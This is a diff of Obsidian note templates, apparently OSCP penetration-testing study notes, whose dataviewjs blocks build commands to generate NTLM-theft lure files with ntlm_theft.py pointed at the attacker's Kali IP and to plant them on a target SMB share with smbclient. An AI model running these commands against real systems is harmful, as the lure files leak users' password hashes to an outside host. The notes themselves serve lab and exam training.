@@ -7,7 +7,7 @@ Create vault.lnk
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `cd ~/Desktop/Tools/Windows/ntlm_theft && python3 ntlm_theft.py -g all -s ${KaliIP} -f vault`;
+const command = `python3 ~/Desktop/Tools/Windows/ntlm_theft/ntlm_theft.py -g all -s ${KaliIP} -f vault`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -28,7 +28,7 @@ Put your vault.lnk into the share (Alter the sharename)
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
-const command = `cd ~/Desktop/Tools/Windows/ntlm_theft/vault && smbclient //${ip}/[sharename]`;
+const command = `cd vault && smbclient //${ip}/[sharename]`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -42,7 +42,6 @@ mput *
 
 ---
 # Trigger the lnk
-
 
 
 ### **1. Connect to the share**
